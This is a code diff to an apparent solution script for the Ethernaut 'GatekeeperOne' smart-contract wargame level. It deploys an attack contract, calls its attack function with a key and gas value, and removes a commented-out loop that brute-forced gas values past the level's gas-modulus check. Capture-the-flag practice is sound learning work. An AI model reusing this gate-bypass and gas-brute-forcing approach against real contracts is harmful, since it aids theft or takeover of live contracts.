@@ -12,7 +12,6 @@ const main = async () => {
   console.log(signer.getAddress())
 
   const targetContract = (await loadOrCreateLevelInstance('GatekeeperOne', levelAddress, signer)) as GatekeeperOne
-  // const targetContract = (await deployContract('GatekeeperOne', [], signer)) as GatekeeperOne
   const attackContract = (await deployContract(
     'GatekeeperOneAttack',
     [targetContract.address],
@@ -29,20 +28,6 @@ const main = async () => {
 
   const attackTxn = await attackContract.attack(key, gas, { gasLimit: 500000 })
   await attackTxn.wait()
-
-  // while (gas < 11000) {
-  //   try {
-  //     console.log(`gas: ${gas}`)
-  //     const attackTxn = await attackContract.attack('0x1212121212121212', gas, { gasLimit: 500000 })
-  //     await attackTxn.wait()
-  //   } catch (error: any) {
-  //     if (error.message.includes('gas modulus')) {
-  //       gas += 1
-  //     } else {
-  //       break
-  //     }
-  //   }
-  // }
 
   const entrant = await targetContract.entrant()
 
